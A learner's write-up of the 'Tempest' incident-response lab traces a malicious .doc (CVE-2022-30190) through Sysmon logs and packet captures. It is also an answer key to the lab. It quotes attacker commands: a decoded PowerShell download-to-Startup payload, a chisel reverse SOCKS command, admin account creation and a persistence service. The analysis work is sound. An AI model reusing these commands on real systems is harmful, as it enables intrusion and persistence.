SOC Level1 Capstone Challenge: Tempest

Objective: This room aims to introduce the process of analyzing endpoint and network logs from a compromised asset. Given the artefacts, we will aim to uncover the incident from the Tempest machine. In this scenario, you will be tasked to be one of the Incident Responders that will focus on handling and analyzing the captured artefacts of a compromised machine.

Required skills:

Basic endpoint analysis

Basic network security analysis

Windows Event Viewer

Sysmon

Wireshark

Brim

Approach:

First, we need to prepare the artifacts and tools needed for the investigation: hash -> CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6


Then we will set up EvtxEcmd, a command-line tool which parses Windows Event Logs into different formats suc CSV, JSON, XML, etc. But first, we need to convert the EVTX logs into CSV using EvtxEcmd.

We can now use TimeLineExplorer.exe.


Next we need to use EventViewer to export the sysmon file into xml format so that it can be used by Sysmon viewer.

Task  3:

What is the SHA256 hash of the capture.pcapng file? CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

What is the SHA256 hash of the sysmon.evtx file? 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F


What is the SHA256 hash of the windows.evtx file?

Top of Form

D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

Top of Form

Top of Form


Task 4 Initial Access – Malicious Document:

In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a CRITICAL severity that needs further investigation.

As reported by the SOC analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

The malicious document has a .doc extension.

The user downloaded the malicious document via chrome.exe.

The malicious document then executed a chain of commands to attain code execution.

Investigation Guide

﻿To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:

Start with the events generated by Sysmon.

EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.

Follow the child processes of WinWord.exe.

Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.

We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

Significant Data Sources:

Sysmon


With this information, I used Sysmon viewer to check out the first source: chrome.exe. Viewing the sysmon files via Sysmon viewer and inspecting chrome.exe led to this result:

The user of this machine was compromised by a malicious document. What is the file name of the document?

free_magicules.doc is the suspicious document that was downloaded. With that we can see a glimpse of the user account that was used to make the download – benimaru, and we can see the name of the computer by using TimeLine Explorer: TEMPEST

What is the name of the compromised user and machine?

the user and machine: benimaru-TEMPEST


What is the PID of the Microsoft Word process that opened the malicious document?Top of Form

Based on the information that was given earlier, the document exececuted commands that began with WINWORD.exe. Tracing the child processes of WINWORD we find that a process was created with a PID of 496.

Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

If we scroll up again we can see the DNS queries attempted and the destination IP.

What is the base64 encoded string in the malicious payload executed by the document?

Top of Form

The next step of the challenge is to find the base64 encoded string the malicious payload executed by the document. To get a better view, I switched to Timeline explorer. From there I started by searching EventID: 496, but it was difficult to find the encoded message. I then instead searched Base64 and got this result.

JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==


What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

An interesting thing to note is msdt.exe. The next question is to find the CVE vulnerability used. The first thing that comes up when looking it up on Google is CVE-2022-30190.


Task 5 Initial Access – Stage 2 Execution:
Based on the initial findings, we discovered that there is a stage 2 execution:

The document has successfully executed an encoded base64 command.

Decoding this string reveals the exact command chain executed by the malicious document.

Investigation Guide

With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:

The Autostart execution reflects explorer.exe as its parent process ID.

Child processes of explorer.exe within the event timeframe could be significant.

Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding in the document execution are worth checking.

Significant Data Sources:

Sysmon


The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

Top of Form

Decrypting the Base64 message leaves us with $app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;

This gives us a lot of information, especially where the file is created. Searching this up in Timeline viewer gives us the full file name: C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

Next, we want to find the implanted payload. I just learned how to apply filters and it made searching a lot easier. I filtered by username, event id, and parent process (explorer.exe) given the hints earlier.

Using the same filter, we can get the information of the IP address and the port used, which will be useful for later.

Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?Top of Form


Unfortunately, I got stuck so I had to restart my approach to filtering, and searched for the executable, and filtered by process creation: the hash of the downloaded file is: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8


The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

Keeping the search query in place, I removed the filter because earlier in the investigation I noticed the DNS queries to resolvecyber.xyz, which turns out to be the connection to the c2 server, on the http port 80.


Task 6 Initial Access – Malicious Document Traffic
Malicious Document Traffic

Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:

We discovered the Domain and IP invoked by the malicious document on Sysmon logs.

There is another domain and IP used by the stage 2 payload logged from the same data source.

Investigation Guide

Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focuses on Network Log Analysis:

We can now use Brim and Wireshark to investigate the packet capture.

Find network events related to the harvested domains and IP addresses.

Sample Brim filter that you can use for this investigation: _path=="http" "<malicious domain>"

Data Sources:

Packet Capture


What is the URL of the malicious payload embedded in the document?



From the previous questions, we know the url of the malicious payload embedded in the document. We can check this in wireshark:

And we can check this again with the other domain:

What is the encoding used by the attacker on the c2 connection?

The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

What is the HTTP method used by the binary?

Based on the user agent, what programming language was used by the attacker to compile the binary? Top of Form


Top of Form

Interestingly enough, we can see that it is encoded in Base64, and we get a lot of information. We see that the c2 bintary connects to /9ab62b5 to execute the command, and that it uses a GET request. Inspecting the packet gives us information on the agent, which tells us what programming language was used by the attacker to compile the binary.


Task 7 Discovery – Internal Reconnaissance

Internal Reconnaissance

Based on the collected findings, we have discovered that the malicious binary continuously uses the C2 traffic:

We can easily decode the encoded string in the network traffic.

The traffic contains the command and output executed by the attacker.

Investigation Guide

To continue with the investigation, we may focus on the following information:

Find network and process events connecting to the malicious domain.

Find network events that contain an encoded command.

We can use Brim to filter all packets containing the encoded string.

Look for endpoint enumeration commands since the attacker is already inside the machine.

In addition, we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filters:

To get all HTTP requests related to the malicious C2 traffic: _path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts

Significant Data Sources:

Packet Capture

Sysmon


The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

Finding this will be a pain, as there are a lot of Base64 encoded commands, and I’m sure there’s an easier way to decode this, but I found It quickly.

The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

Turns out we are still not done with Base64 and we still need to keep decoding.
After a while of searching, I came up with this. Doing some research on the ports, it seems like port 5985 is the listening port, as it is primarily associated with Windows Remote Management (WinRM)'s HTTP listener.

The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

Luckily, we already found this earlier, and this is just: C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

This is also found in the same row, so after searching for it, the sum is 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451.

What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.

Time for some OSINT. Looking up the hash on VirusTotal tells us what tool was used: chisel.

The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

The succeeding command is highlighted. Doing some research, it is a legit windows host process for Winrm, which is our answer.

Task 8 Privilege Escalation – Exploiting Privileges

Privilege Escalation

Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.

Investigation Guide

With this, we can focus on the following network and endpoint events:

Look for events executed after the successful execution of the reverse socks proxy tool.

Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.

Significant Data Sources:

Packet Capture

Sysmon


After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

In the downloads folder is a file named spf.exe, and since I lost track of it, I searched for it again and got the hash: 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

An interesting note is that final.exe is present in the search, which would be reasonable since we found a “first.exe” earlier.


Based on the SHA256 hash of the binary, what is the name of the tool used?

VirusTotal tells us that its printspoofer

The tool exploits a specific privilege owned by the user. What is the name of the privilege?

Doing searching “printspoofer privilege escalation” shows us that it abuses a windows service called SeImpersonatePrivilege

Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

This came up earlier, its final.exe

The binary connects to a different port from the first c2 connection. What is the port used?

Top of Form

Filtering by DNS query in Timeline Explorer shows us that the queryname used is resolvecyber when using final.exe Since we were looking at packets earlier with the filter “http.host == resolvecyber.xyz”, we already know the destination ip, and using that as a filter gives us the port via packet inspection: 8080, as the only two ports that show up are 80 and 8080.

Task 9 Actions on Objectives – Fully-owned Machine

Fully-Owned Machine

Now, the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker.

In addition, the unusual executions are related to the malicious C2 binary used during privilege escalation.

Investigation Guide

Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:

Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : _path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts

The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with NT Authority\System.

All child events of the new malicious binary used for C2 are worth checking.

Significant Data Sources:

Packet Capture

Sysmon

Windows Event Logs

Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

Doing some research, net.exe is responsible for managing users and other things. Since it’s a process that is created, I filtered by event ID 1, and scrolling through the executable info I found two users: shion and shuna


Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

I applied an additional filter to only show net.exe

With this it is much easier to see that the missing command is /add


Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

This can be found by research: 4720


The attacker added one of the accounts to the local administrator's group. What is the command used by the attacker?

This is also found in the screenshot above. It’s net1 localgroup administrators /add shion


Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

Also, via research: 4732

After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

Earlier while looking for final.exe, I found something interesting, and viewing the order of events after account creation, this command was executed to achieve persistence:


C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto


Key Takeaways:

This was a very long challenge. I have had experience with a couple of these tools such as Wireshark, however the largest learning curve was using Timeline Explorer to apply the necessary filters to get relevant data. This challenge also mapped out a full attack chain, which made it pretty difficult and long, but it was a valuable experience.

Learned how to analyze Windows event logs and Sysmon data to trace malicious document execution and command chains

Investigated state 2 payloads and C2 traffic using Wireshark

Gained experience in correlating data across multiple data sources for a comprehensive incident response

Gained exposure to common IoC for TTPs and the exploits used and connecting findings to attacker’s tactics mapped to MITRE ATT&CK

